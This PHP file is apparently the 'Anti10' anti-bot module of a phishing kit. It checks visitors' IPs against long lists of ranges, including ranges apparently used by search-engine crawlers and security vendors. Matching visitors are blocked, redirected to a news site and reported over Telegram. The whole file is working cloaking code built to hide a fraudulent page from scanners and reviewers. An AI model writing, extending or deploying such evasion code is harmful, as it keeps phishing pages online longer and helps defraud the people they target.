<?php
// Anti10: Advanced IP Range Blocking (from anti2 system)
// Extensive IP range blocking for known bot networks

// No bypass system - full protection active

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Extensive banned IP ranges
$banned_ip_ranges = array(
    "^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", 
    "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",
    "^66.150.14.*", "^54.176.*.*", "^184.173.*.*", "^66.249.*.*", 
    "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^209.85.128.*", 
    "^216.239.32.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", 
    "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", 
    "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", 
    "^46.116.*.*", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", 
    "^85.64.*.*", "^85.250.*.*", "^93.172.*.*", "^109.186.*.*", 
    "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", 
    "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", 
    "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", 
    "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", 
    "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", 
    "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", 
    "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", 
    "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", 
    "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", 
    "^193.220.178.*", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", 
    "^208.91.115.*", "^199.30.228.*"
);

// Additional specific blocked IPs
$specific_blocked_ips = array(
    '1.9.2.13', '1.9.2.15', '62.210.13.58', '104.62.2.60', 
    '104.83.233.198', '107.178.194.64', '108.161.29.60', 
    '115.238.55.18', '119.97.214.138', '138.197.207.147',
    '145.239.156.71', '145.239.156.89', '150.70.168.35', 
    '150.70.188.167', '154.127.57.30', '162.243.128.197',
    '68.65.53.71'
);

// Check specific IPs first
if (in_array($client_ip, $specific_blocked_ips)) {
    require_once __DIR__ . '/telegram_notify.php';
    notifyBotBlocked($client_ip, $user_agent, "Blocked specific IP detected");
    
    error_log("Blocked specific IP: {$client_ip}");
    header('HTTP/1.1 403 Forbidden');
    header('Location: https://www.mediapart.fr/');
    exit();
}

// Check IP ranges
foreach($banned_ip_ranges as $ip_range) {
    // Convert pattern to regex
    $pattern = str_replace(array('*', '.'), array('[0-9]+', '\.'), $ip_range);
    $pattern = '/^' . $pattern . '$/';
    
    if (preg_match($pattern, $client_ip)) {
        require_once __DIR__ . '/telegram_notify.php';
        notifyBotBlocked($client_ip, $user_agent, "Blocked IP range detected: {$ip_range}");
        
        error_log("Blocked IP range: {$ip_range} matched {$client_ip}");
        header('HTTP/1.1 403 Forbidden');
        header('Location: https://www.mediapart.fr/');
        exit();
    }
}
